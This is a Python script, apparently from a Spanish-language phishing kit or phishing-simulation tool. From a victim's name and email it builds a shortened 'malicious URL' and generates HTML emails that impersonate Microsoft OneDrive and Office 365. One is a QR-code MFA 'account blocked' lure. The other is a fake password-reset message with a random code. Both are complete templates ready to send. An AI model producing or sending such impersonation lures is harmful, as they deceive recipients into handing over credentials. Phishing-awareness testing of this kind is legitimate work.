import time
import os
import sys

#Generate Fake MFA Codes
import random

from helper.helper import get_input_es,saveTemplateGenerated,urlShorter,qrGeneratorbyUrl


def onedrive_es():
  #Información de la victima
  userName,url,userEmail,currentDate=get_input_es()
  
  ##Recopilación datos
  print("\nGenerando suplantanción OneDrive...")
  print("\nLos datos de la victima usados para este ataque:\n[Usuario]:"+userName+"\n[Email]:"+userEmail)
  urlShort=urlShorter(url+userName)
  print("\n[Url Maliciosa]:"+url+userName+"\n[Url Acortada]:"+urlShort)
  
  ##HTML que se enviara a la victima
  mode = int(input("\nIntroduce el metodo que quieres utilizar\n[0]QR\n[1]URL\n-->"))
  if mode==0:
    onedrive_QR(userName,userEmail,urlShort,currentDate)
  elif mode==1:
    onedrive_html(userName,userEmail,urlShort,currentDate)
  else:
    print("\nEl metodo que quieres utilizar no esta en la lista, reiniciando...")
    onedrive_es()

def onedrive_QR(userName,userEmail,urlShort,currentDate):
  #Use QR generator by URL
  qrImage=qrGeneratorbyUrl(urlShort,userName)
  
  #QR="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAABJRU5ErkJggg=="
  ##HTML suplantacion santander
  onedrive_QR_html=("""
<html>

<head></head>

<body>
  <table class="Table" style="width:411.0pt; background:white; border-collapse:collapse; border:undefined" width="548">
    <tbody>
      <tr>
        <td style="background:white; padding:0cm 0cm 15.0pt 0cm">
          <p><span style="font-size:11pt"><span style="font-family:Calibri,sans-serif"><span style="color:black"><a
                    href="javascript:;window.parent.$('#webModal').modal('show');"><img
                      src="https://d1yynrqd2fp86j.cloudfront.net/EmailTemplates/Common/images/o365-qr-logo.png"
                      style="width:126px; height:28px"></a></span></span></span></p>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 7.5pt 0cm">
          <p align="center" style="text-align:center"><span style="font-size:11pt"><span
                style="font-family:Calibri,sans-serif"><span style="font-size:18.0pt"><span
                    style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:black">Mantenga su cuenta
                      segura</span></span></span> </span></span></p>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 15.0pt 0cm">
          <p align="center" style="text-align:center"><span style="font-size:11pt"><span
                style="font-family:Calibri,sans-serif"><span style="font-size:12.0pt"><span
                    style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:black">Su organización
                      requiere autenticación multifactor.
                      Su cuenta ha sido bloqueada temporalmente.</span></span></span></span></span></p>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 11.25pt 0cm">
          <table class="Table" style="width:411.0pt; border-collapse:collapse; border:undefined" width="548">
            <tbody>
              <tr>
                <td style="width:135.75pt; padding:0cm .75pt 0cm .75pt" valign="bottom" width="181">
                  <p translate="no"><span style="font-size:11pt"><span style="font-family:Calibri,sans-serif"><b><span
                            style="font-size:11.5pt"><span style="font-family:&quot;Segoe UI&quot;,sans-serif"><span
                                style="color:black"><span>{}</span></span></span></span></b></span></span>
                  </p>
                </td>
                <td style="width:139.5pt; padding:0cm .75pt 0cm .75pt" valign="bottom" width="186">&nbsp;</td>
                <td style="width:135.75pt; padding:0cm .75pt 0cm .75pt" valign="bottom" width="181">
                  <p align="right" style="text-align:right"><span style="-ms-text-size-adjust:100%"><span
                        style="font-size:11pt"><span style="font-family:Calibri,sans-serif"><b><span
                              style="font-size:11.5pt"><span style="font-family:&quot;Segoe UI&quot;,sans-serif"><span
                                  style="color:black">Office 365</span></span></span></b></span></span></span></p>
                </td>
              </tr>
              <tr>
                <td style="width:135.75pt; padding:0cm .75pt 0cm .75pt" width="181">
                  <p><span style="-ms-text-size-adjust:100%"><span style="font-size:11pt"><span
                          style="font-family:Calibri,sans-serif"><b><span style="font-size:10.5pt"><span
                                style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:#c00000">Acción
                                  Requerida</span></span></span></b> </span></span></span></p>
                </td>
                <td style="width:139.5pt; padding:0cm .75pt 0cm .75pt" width="186">&nbsp;</td>
                <td style="width:135.75pt; padding:0cm .75pt 0cm .75pt" width="181">&nbsp;</td>
              </tr>
              <tr style="height:12.65pt">
                <td colspan="3" style="padding:0cm 0cm 0cm 0cm; height:12.65pt">
                  <table class="Table" style="border-collapse:collapse; border-spacing:0px 0px; border:undefined">
                    <tbody>
                      <tr style="height:7.5pt">
                        <td style="background:#c00000; width:135.0pt; padding:0cm 0cm 0cm 0cm; height:7.5pt"
                          width="180">
                          <p><span style="font-size:11pt"><span style="line-height:7.5pt"><span
                                  style="font-family:Calibri,sans-serif">&nbsp;</span></span></span></p>
                        </td>
                        <td style="background:white; width:3.0pt; padding:0cm 0cm 0cm 0cm; height:7.5pt" width="4">
                          <p><span style="font-size:11pt"><span style="line-height:7.5pt"><span
                                  style="font-family:Calibri,sans-serif">&nbsp;</span></span></span></p>
                        </td>
                        <td style="background:#cccccc; width:135.0pt; padding:0cm 0cm 0cm 0cm; height:7.5pt"
                          width="180">
                          <p><span style="font-size:11pt"><span style="line-height:7.5pt"><span
                                  style="font-family:Calibri,sans-serif">&nbsp;</span></span></span></p>
                        </td>
                        <td style="background:white; width:3.0pt; padding:0cm 0cm 0cm 0cm; height:7.5pt" width="4">
                          <p><span style="font-size:11pt"><span style="line-height:7.5pt"><span
                                  style="font-family:Calibri,sans-serif">&nbsp;</span></span></span></p>
                        </td>
                        <td style="background:#cccccc; width:135.0pt; padding:0cm 0cm 0cm 0cm; height:7.5pt"
                          width="180">
                          <p><span style="font-size:11pt"><span style="line-height:7.5pt"><span
                                  style="font-family:Calibri,sans-serif">&nbsp;</span></span></span></p>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </td>
              </tr>
              <tr>
                <td style="width:135.75pt; padding:0cm 0cm 0cm 0cm" width="181">
                  <p><span style="-ms-text-size-adjust:100%"><span style="font-size:11pt"><span
                          style="line-height:15.0pt"><span style="font-family:Calibri,sans-serif"><span
                              style="font-size:10.5pt"><span style="font-family:&quot;Segoe UI&quot;,sans-serif"><span
                                  style="color:#c00000">OTP de autenticación multifactor necesario de
                                  actualizar</span></span></span>
                          </span></span></span></span></p>
                </td>
                <td style="width:139.5pt; padding:0cm 0cm 0cm 0cm" width="186">&nbsp;</td>
                <td style="width:135.75pt; padding:0cm 0cm 0cm 0cm" width="181">&nbsp;</td>
              </tr>
            </tbody>
          </table>
        </td>
      </tr>
      <tr>
        <td style="background:white; width:100.0%; padding:0cm 7.5pt 0cm 7.5pt" width="100%">
          <p>&nbsp;</p>

          <table class="Table" style="width:100.0%; background:#f2f5fa; border:undefined" width="100%">
            <tbody>
              <tr>
                <td style="background:#f2f5fa; padding:0cm 7.5pt 0cm 7.5pt">
                  <p><span style="-ms-text-size-adjust:100%"><span style="font-size:11pt"><span
                          style="font-family:Calibri,sans-serif"><span style="font-size:16.0pt"><span
                              style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:black">Escanea el
                                codigo para empezar</span></span></span></span></span></span></p>
                </td>
              </tr>
              <tr>
                <td style="background:#f2f5fa; padding:0cm 7.5pt 4.5pt 7.5pt">
                  <p><span style="-ms-text-size-adjust:100%"><span style="font-size:11pt"><span
                          style="font-family:Calibri,sans-serif"><span style="font-size:12.0pt"><span
                              style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:black">Utilice la
                                aplicación de la cámara de su teléfono para escanear el código QR.
                                Esto iniciará el proceso de verificación de su cuenta con
                                Microsoft.</span></span></span></span></span></span></p>

                  <p>&nbsp;</p>

                  <p align="center" style="text-align:center"><span style="-ms-text-size-adjust:100%"><span
                        style="font-size:11pt"><span style="font-family:Calibri,sans-serif"><span
                            style="font-size:12.0pt"><span style="font-family:&quot;Segoe UI&quot;,sans-serif"><span
                                style="color:black">{}</span></span></span></span></span></span>
                  </p>
                </td>
              </tr>
              <tr>
                <td style="background:#f2f5fa; padding:0cm 0cm 0cm 0cm; border-spacing:0px 0px">&nbsp;</td>
              </tr>
              <tr>
                <td style="background:#f2f5fa; padding:0cm 7.5pt 4.5pt 7.5pt">
                  <p><span style="-ms-text-size-adjust:100%"><span style="font-size:11pt"><span
                          style="font-family:Calibri,sans-serif"><span style="font-size:12.0pt"><span
                              style="font-family:&quot;Segoe UI&quot;,sans-serif"><span style="color:black">Si el
                                problema persiste, reenvíe este mensaje a su administrador de correo electrónico. Para
                                obtener soporte&nbsp;<a
                                  href="javascript:;window.parent.$('#webModal').modal('show');">https://www.microsoft.com/es-es/trust-center</a></span></span></span></span></span></span>
                  </p>
                </td>
              </tr>
            </tbody>
          </table>

          <p>&nbsp;</p>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:7.5pt 0cm 3.0pt 0cm">
          <p><br>
            <span style="font-size:11pt"><span style="font-family:Calibri,sans-serif"><span
                  style="font-size:10.5pt"><span style="font-family:&quot;Segoe UI&quot;,sans-serif"><span
                      style="color:black"><em><span style="font-family:&quot;Segoe UI&quot;,sans-serif">¿Fue de ayuda? <a href="javascript:;window.parent.$('#webModal').modal('show');"
                            style="color:blue; text-decoration:underline">Enviar comentarios a Microsoft</a>.</span></em>
                    </span></span></span></span></span>
          </p>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">
          <div align="center" style="text-align:center">
            <hr align="center" size="1" width="100%">
          </div>
        </td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:white; padding:0cm 0cm 0cm 0cm">&nbsp;</td>
      </tr>
    </tbody>
  </table>
</body>
</html>
                   """.format(userEmail,qrImage))
  saveTemplateGenerated(userName,"OneDriveQR",onedrive_QR_html,"Re-activación MFA cuenta microsoft","notificaciones@movicoders.link",userEmail)

def onedrive_html(userName,userEmail,urlShort,currentDate):
    
    randomCode=random.randint(100000,999999)
    
    ##HTML que se enviara a la victima
    oneDriveHtml=("""
<div class="maincontent">
  <table
    width="100%"
    cellpadding="0"
    cellspacing="0"
    border="0"
    class="message"
  >
    <tbody>
      <tr>
        <td>
          <font size="-1"
            ><b>Equipo de cuentas Microsoft </b
            >&lt;{}&gt;</font
          >
        </td>
        <td align="right"><font size="-1">{}</font></td>
      </tr>
      <tr>
        <td colspan="2" style="padding-bottom: 4px">
          <font size="-1" class="recipient"
            ><div>Para: {}</div></font
          >
        </td>
      </tr>
      <hr />
      <tr>
        <td colspan="2">
          <table width="100%" cellpadding="12" cellspacing="0" border="0">
            <tbody>
              <tr>
                <td>
                  <div style="overflow: hidden">
                    <font size="-1">
                      <u></u>
                      <div>
                        <table dir="ltr">
                          <tbody>
                            <tr>
                              <td
                                id="m_7236929832340295984i1"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI Semibold',
                                    'Segoe UI Bold', 'Segoe UI',
                                    'Helvetica Neue Medium', Arial, sans-serif;
                                  font-size: 17px;
                                  color: #707070;
                                "
                              >
                                Cuenta Microsoft
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i2"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI Light', 'Segoe UI',
                                    'Helvetica Neue Medium', Arial, sans-serif;
                                  font-size: 41px;
                                  color: #2672ec;
                                "
                              >
                                Código para restablecer contraseña
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i3"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Usa este código para restablecer la contraseña
                                de la cuenta Microsoft
                                <a
                                  dir="ltr"
                                  id="m_7236929832340295984iAccount"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="{}"
                                  target="_blank"
                                  >{}</a
                                >.
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i4"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Este es tu código:
                                <span
                                  style="
                                    font-family: 'Segoe UI Bold',
                                      'Segoe UI Semibold', 'Segoe UI',
                                      'Helvetica Neue Medium', Arial, sans-serif;
                                    font-size: 14px;
                                    font-weight: bold;
                                    color: #2a2a2a;
                                  "
                                  >{}</span
                                >
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i5"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Si no reconoces la cuenta de Microsoft
                                <a
                                  dir="ltr"
                                  id="m_7236929832340295984iAccount"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="microsoft.com"
                                  target="_blank"
                                  >{}</a
                                >, puedes
                                <a
                                  id="m_7236929832340295984iLink2"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="{}"
                                  target="_blank"
                                  data-saferedirecturl="https://www.google.com/url?hl=es"
                                  >hacer clic aquí</a
                                >
                                para quitar tu dirección de correo electrónico
                                de ella.
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i6"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Gracias,
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i7"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                El equipo de cuentas Microsoft
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        <div
                          lang="es"
                          style="margin-top: 20px; margin-bottom: 10px"
                        >
                          <a
                            class="m_7236929832340295984link"
                            href="https://go.microsoft.com/fwlink/?LinkId=521839"
                            target="_blank"
                            data-saferedirecturl="https://www.google.com/url?hl=es&amp;q=https://go.microsoft.com/fwlink/?LinkId%3D521839&amp;source=gmail&amp;ust=1715064983183000&amp;usg=AOvVaw23cXYFUFRXvAeeePxqwZU8"
                            >Declaración de privacidad</a
                          >
                          <div style="margin-top: 10px">
                            Microsoft Corporation, One
                            <a
                              href="https://www.google.com/maps/search/Microsoft+Way,+Redmond,+WA+98052?entry=gmail&amp;source=g"
                              >Microsoft Way, Redmond, WA 98052</a
                            >
                          </div>
                        </div>
                      </div>
                    </font>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </td>
      </tr>
    </tbody>
  </table>
</div>

                   """.format("notificaciones@movicoders.link",currentDate,userEmail,urlShort,userEmail,randomCode,userEmail,urlShort))
    saveTemplateGenerated(userName,"OneDrive",oneDriveHtml,"Recupera tu cuenta Office","notificaciones@movicoders.link",userEmail)
    